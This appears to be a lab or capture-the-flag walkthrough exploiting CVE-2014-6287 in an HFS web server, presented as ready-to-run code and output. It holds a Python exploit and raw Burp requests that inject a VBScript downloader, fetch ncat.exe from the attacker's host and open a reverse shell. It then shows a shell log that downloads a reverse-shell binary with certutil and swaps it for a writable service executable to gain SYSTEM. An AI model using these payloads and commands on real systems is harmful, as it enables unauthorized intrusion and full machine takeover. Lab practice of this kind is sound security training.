## By python

Updated script
```python
import urllib2
import sys

ip_addr = "10.18.21.236" #local IP address
local_port_http = "8000" # Local Port number
local_port_nc = "443" # Local Port number

urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+save|C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+":"+local_port_http+"%2Fshells%2Fncat.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cncat.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with.}")
urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+exec|cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs.}")
#add pause
urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+exec|C%3A%5CUsers%5CPublic%5Cncat.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port_nc+".}")
```

```sh
┌──(kali㉿kali)-[~]
└─$ python2 CVE-2014-6287.py 10.10.175.80 8080
```

---
## By burp

Request 1
```http
GET /?search=%00{.+save|C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F10.18.21.236:8000%2Fshells%2Fncat.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cncat.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with.} HTTP/1.1
Host: 10.10.175.80:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://10.10.175.80:8080/
Cookie: HFS_SID=0.113615839509293
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1


```

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://"+ip_addr+"/nc.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\nc.exe", 2 '//overwrite
end with"
```

Request 2
```http
GET /?search=%00{.+exec|cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs.}
HTTP/1.1
Host: 10.10.175.80:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://10.10.175.80:8080/
Cookie: HFS_SID=0.113615839509293
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1


```

Request 3
```http
GET /?search=%00{.+exec|C%3A%5CUsers%5CPublic%5Cncat.exe%20-e%20cmd.exe%2010.18.21.236%20443.}
HTTP/1.1
Host: 10.10.175.80:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://10.10.175.80:8080/
Cookie: HFS_SID=0.113615839509293
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1


```

bill shell
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.175.80] 49539
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Users\bill\Desktop

C:\Users\bill\Desktop>certutil -urlcache -split -f "http://10.18.21.236:8000/enum/winPEASany.exe" "C:\Users\bill\Desktop\winpeas.exe"

...
����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                        
    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected                                                                      
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
    Advanced SystemCare Service
...

C:\Users\bill\Desktop>powershell -c Get-Service              
powershell -c Get-Service

Status   Name               DisplayName                           
------   ----               -----------                           
Running  AdvancedSystemC... Advanced SystemCare Service 9         
Stopped  AeLookupSvc        Application Experience                
Stopped  ALG                Application Layer Gateway Service  
...

C:\Users\bill\Desktop>sc query
sc query

SERVICE_NAME: AdvancedSystemCareService9
DISPLAY_NAME: Advanced SystemCare Service 9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AmazonSSMAgent
DISPLAY_NAME: Amazon SSM Agent
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
...

C:\Users\bill\Desktop>sc query AdvancedSystemCareService9
sc query AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\Desktop>net stop AdvancedSystemCareService9
net stop AdvancedSystemCareService9
.
The Advanced SystemCare Service 9 service was stopped successfully.

C:\Users\bill\Desktop>certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-win-x86-service.exe" "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"

C:\Users\bill\Desktop>net start AdvancedSystemCareService9
net start AdvancedSystemCareService9
The Advanced SystemCare Service 9 service is starting.
```

nt authority\system shell
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.175.80] 49551
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>   
```
